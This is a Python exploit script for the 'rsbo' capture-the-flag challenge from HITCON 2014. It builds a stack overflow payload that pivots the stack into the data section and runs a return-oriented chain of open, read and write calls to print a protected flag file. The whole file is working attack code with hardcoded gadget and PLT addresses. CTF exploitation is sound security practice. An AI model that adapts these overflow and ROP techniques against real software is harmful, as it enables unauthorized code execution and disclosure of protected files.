"""
Generate a payload to exploit rsbo (HITCON 2014)

Author: clu (notclu@gmail.com)
"""

import sys
import struct

read_plt = struct.pack('I', 0x080483E0)
write_plt = struct.pack('I', 0x08048450)
open_plt = struct.pack('I', 0x08048420)

pop2_gadget = struct.pack('I', 0x804879e)
pop3_gadget = struct.pack('I', 0x0804879D)
pop4_gadget = struct.pack('I', 0x0804879C)

read_and_leave = struct.pack('I', 0x8048678)

data_start = 0x804A038 + 4*8

flag_filename = struct.pack('I', 0x80487D0) # The flag path in  .rodata
data_minus4_section = struct.pack('I', data_start-4)
data_section = struct.pack('I', data_start)

# Use the bss as a read buffer for the flag
read_buf = struct.pack('I', data_start+100)

##### First stage in stack ####
# reads our payload into the data section and pivots the stack into the data section
sys.stdout.write('\x00' * 0x60) # Needs to be 0 so for loop terminates quickly
sys.stdout.write('\xAA\xAA\xAA\xAA') # dont care
sys.stdout.write('\xBB\xBB\xBB\xBB') # dont care
sys.stdout.write(data_minus4_section) # saved bp (used to pivot the esp in read_and_leave)

# read(0, data_section, 0x80)
# esp = ebp (stack pivot to data section)
sys.stdout.write(read_and_leave) # ret
sys.stdout.write(struct.pack('I', 0)) # fd
sys.stdout.write(data_section) # buf
sys.stdout.write(struct.pack('I', 0x80)) # nbytes

#### Second stage in data/bss ####
sys.stdout.write('\xAA\xAA\xAA\xAA')

# Open always seems to return fd=3
# open('/home/rsbo/flag', 0) = 3
sys.stdout.write(open_plt) # return address for read_and_leave
sys.stdout.write(pop2_gadget) # Need to advance the esp past the args
sys.stdout.write(flag_filename) # filename pointer
sys.stdout.write(struct.pack('I', 0)) # oflags

# Read the flag from disk
# read(3, read_buf, 0x40)
sys.stdout.write(read_plt) # ret from pop2
sys.stdout.write(pop3_gadget) # advance the esp past the args
sys.stdout.write(struct.pack('I', 3)) # fd
sys.stdout.write(read_buf) # buf
sys.stdout.write(struct.pack('I', 0x40)) # nbytes

# Write the flag to stdout
# write(1, read_buf, 0x40)
sys.stdout.write(write_plt) # ret from pop3
sys.stdout.write('\xAA\xAA\xAA\xAA') # Doesn't matter what we return to
sys.stdout.write(struct.pack('I',1)) # fd
sys.stdout.write(read_buf) # buf
sys.stdout.write(struct.pack('I', 0x40)) # nbytes
